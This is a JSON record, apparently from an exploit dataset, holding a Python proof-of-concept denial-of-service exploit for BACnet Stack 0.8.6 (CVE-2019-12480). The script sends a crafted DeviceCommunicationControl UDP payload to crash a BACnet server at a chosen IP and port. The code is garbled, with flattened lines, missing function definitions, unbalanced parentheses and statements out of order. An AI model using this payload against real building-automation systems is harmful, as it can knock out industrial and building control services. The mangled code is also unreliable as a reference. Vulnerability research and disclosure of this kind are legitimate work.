{
    "text": "vul_name : BACnet Stack 0.8.6 Denial Of Service ， vul_cve : CVE-2019-12480 ， vul_poc :  # Exploit Title : BACnet Stack 0.8.6 - Denial of Service ，  # Google Dork :  [ if applicable ]  ，  # Date : 2019-07-19 ，  # Exploit Author : mmorillo ，  # Vendor Homepage :  ，  # Software Link :  ，  # Version : bacnet-stack-0.8.6 ，  # Tested on : Linux ，  # CVE : CVE-2019-12480 ，  #  ! /usr/bin/env python ，  # After reported the bug to the vendor , sharing details ，  # about the vulnerability , as well as proof-of-concept code ( exploit code to ，  # test )  , has been release a fix for 0.8.7 release of ，  # BACnet Protocol Stack ， from termcolor import colored ，  # Command line parser using argparse ， parser = argparse.ArgumentParser ( conflict_handler='resolve' , add_help=True ,  ， description='BACnet Protocol Stack Segmentation fault leading to denial of service' , version='0.1' ,  ， usage=\"python % ( prog ) s\" )  ，  # Mandatory ， parser.add_argument ( 'Server' , type=str , help='BACnet server IP' )  ， parser.add_argument ( 'Port' , type=str , help='BACnet port' )  ， host_name = socket.gethostname (  )  ， host_ip = socket.gethostbyname ( host_name )  ， print ( \"Unable to get Hostname and IP\" )  ， response = os.system ( \"nc -u -z -w 1 \" + BACnetServer + \" \" + str ( BACnetPort )  ，  # Main of program ，  # Get the command line parser. ， parser = cmdline_parser (  )  ，  # Show help if no args ， parser.print_help (  )  ， sys.exit ( 1 )  ，  # Get results line parser. ， results = parser.parse_args (  )  ， BACnetServer = results.Server ， BACnetPort = int ( results.Port )  ， SRC_IP = get_Host_name_IP (  )  ， print ( colored ( \" [ + ] BACnet server down\" , \"yellow\" )  ， payload_DeviceCommunicationControl = \"\\x81\\x0a\\x00\\x16\\x01\\x04\\x00\\x05\\x01\\x11\\x0d\\xff\\x80\\x00\\x03\\x1a\\x0a\\x19\\x00\\x2a\\x00\\x41\" ， print ( colored ( \" [ + ] Sending BACnet DeviceCommunicationControl payload from \" + SRC_IP , \"green\" )  ， s = socket.socket ( socket.AF_INET , socket.SOCK_DGRAM )  # UDP ， s.connect ( BACnetServer , BACnetPort )  ， s.send ( struct.pack ( '>I' , len ( payload_DeviceCommunicationControl )  ， s.send ( payload_DeviceCommunicationControl ) ",
    "time": "2019.07.25"
}